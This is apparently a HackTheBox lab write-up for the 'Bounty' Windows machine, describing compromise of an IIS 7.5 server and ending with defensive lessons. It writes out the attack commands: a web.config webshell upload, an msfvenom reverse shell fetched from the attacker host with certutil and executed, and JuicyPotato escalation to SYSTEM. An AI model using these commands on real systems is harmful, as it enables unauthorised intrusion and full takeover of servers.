# Bounty — HackTheBox

| Field | Detail |
|---|---|
| OS | Windows Server 2008 R2 |
| Difficulty | Easy |
| Service | IIS 7.5 / ASP.NET |
| Date | March 2026 |
| Result | NT AUTHORITY\SYSTEM |

## Summary

IIS 7.5 with an upload form. Extension filter bypassed by uploading a malicious `web.config` executing classic ASP. Privilege escalation via `SeImpersonatePrivilege` with JuicyPotato.

## Attack Chain

| # | Technique | Result |
|---|---|---|
| 1 | Nmap | Port 80, IIS 7.5, ASP.NET |
| 2 | Gobuster | `/transfer.aspx` and `/uploadedfiles` discovered |
| 3 | web.config upload | Extension filter bypassed, webshell active |
| 4 | Meterpreter shell | Session as `bounty\merlin` |
| 5 | ms16_075_reflection_juicy | Privesc to `NT AUTHORITY\SYSTEM` |

## Reconnaissance

```bash
nmap -sC -sV 10.129.5.50
gobuster dir -u http://10.129.5.50 -w /usr/share/wordlists/dirb/common.txt -x asp,aspx,config,txt
```

Key findings: `/transfer.aspx` (upload form), `/uploadedfiles/` (destination directory).

## Initial Access — web.config Upload

`/transfer.aspx` blocks `.aspx` but not `.config`. IIS 7.5 processes `web.config` via `asp.dll`. A malicious `web.config` with an embedded ASP webshell is uploaded undetected.

Payload source: https://github.com/swisskyrepo/PayloadsAllTheThings

```
# Access webshell — note capital U
http://10.129.5.50/UploadedFiles/web.config?cmd=whoami
# bounty\merlin
```

> The machine auto-deletes uploaded files every few minutes — re-upload as needed.

## Reverse Shell

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.48 LPORT=4444 -f exe -o shell.exe
python3 -m http.server 8080
```

From webshell:
```
certutil -urlcache -f http://10.10.15.48:8080/shell.exe C:\Windows\Temp\shell.exe
C:\Windows\Temp\shell.exe
```

## Privilege Escalation — SeImpersonatePrivilege

```
whoami /priv
# SeImpersonatePrivilege enabled
```

```bash
use exploit/windows/local/ms16_075_reflection_juicy
set SESSION 1
set LHOST 10.10.15.48
run
# NT AUTHORITY\SYSTEM
```

## Lessons Learned

- Upload filters must be **whitelists**, not blacklists — `.config` is as dangerous as `.aspx`
- `SeImpersonatePrivilege` chain: churrasco (2003) → JuicyPotato (2008–2016) → RoguePotato/PrintSpoofer (modern)
